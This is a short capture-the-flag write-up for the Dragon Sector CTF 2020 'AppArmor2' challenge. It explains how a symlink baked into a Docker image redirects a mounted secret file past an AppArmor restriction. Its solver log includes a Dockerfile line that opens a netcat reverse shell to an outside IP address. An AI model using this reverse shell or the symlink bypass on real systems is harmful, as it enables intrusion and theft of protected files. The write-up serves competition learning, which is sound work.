### Writeup for the AppArmor2 task from Dragon Sector CTF 2020  
This is a very short writeup to the "AppArmor2" challenge from the [Dragon
Sector CTF 2020](https://ctftime.org/event/1082), solved by disconnect3d from
justCatTheFish ctf team.

In this CTF challenge, there was a custom AppArmor policy applied to the run
containers, such that it disallowed reads/writes to `/flag-*` paths.

We, as a user, could only provide a docker image that was built and run later
on, and the flag (which we wanted to steal) was mounted as a volume into the
run container with a `docker run -v /flag.txt:/flag-XXYY ...` invocation. The
`XXYY` part was random.

### Solution

The solver is in `./solve.sh`. When running for first time, you need to:  
* update the (referenced) docker image name in `build.sh` and the `<<YOURIP>>` part  
* login to gitlab docker registry (`docker login`) and share your project with `dragonsectorclient` (that's how you shared the docker image with the challenge, and the challenge pulled and run it later on)

The *bug* here is that AppArmor denies read/write/etc to `/flag-*` but this
limitation is enforced during container run time **but not during its build
time AND that Docker will follow symlinks present in the image when mounting
files with `docker run -v /hostpath:/containerpath ...`**.

So it turns out that when the `docker run -v something:somepath ...` is
invoked, the `somepath` follows links and we can make a link from `/flag-XXYY`
to `/D` in our image. In the end, the `docker run -v /flag.txt:/flag-XXYY ...`
will mount `flag.txt` into `/D` which we can read.

```  
dc@jhtc:~/dsctf/x/task/ds-apparmor-task/solution$ ./solve.sh  
mkdir: cannot create directory ‘rootfs’: File exists  
Sending build context to Docker daemon  33.56MB  
Step 1/4 : FROM ubuntu  
---> d70eaf7277ea  
Step 2/4 : RUN apt update && apt install -y netcat-traditional  
---> Using cache  
---> 40ac85e97bbe  
Step 3/4 : ADD rootfs /  
---> Using cache  
---> 17f203a1ee6a  
Step 4/4 : CMD nc 51.38.138.162 4444 -e /bin/sh  
---> Using cache  
---> 422aece7a145  
Successfully built 422aece7a145  
Successfully tagged registry.gitlab.com/mytempaccount123/test:latest  
The push refers to repository [registry.gitlab.com/mytempaccount123/test]  
3c45abc528a8: Layer already exists  
be0923227e77: Layer already exists  
cc9d18e90faa: Layer already exists  
0c2689e3f920: Layer already exists  
47dde53750b4: Layer already exists  
latest: digest:
sha256:fda92fc789dbfde33799502d18e30e8f3b2d184d9942ea1e6c5ff75f7003ffd5 size:
1365  
[+] Opening connection to apparmor2.hackable.software on port 1337: Done  
Executing b'hashcash -mb26 udqynihh'  
out b'1:26:201121:udqynihh::i6HwB+Gk4OttOKvq:000000005+DgO\n'  
b'Image added to the queue\n'  
Listening on [0.0.0.0] (family 0, port 4444)  
Connection from 156.95.107.34.bc.googleusercontent.com 56178 received!  
DrgnS{4e77cd33ffb0c7802b39303f7452fd90}  
```  

Original writeup
(https://github.com/disconnect3d/writeups/tree/master/dsctf2020-apparmor2-task).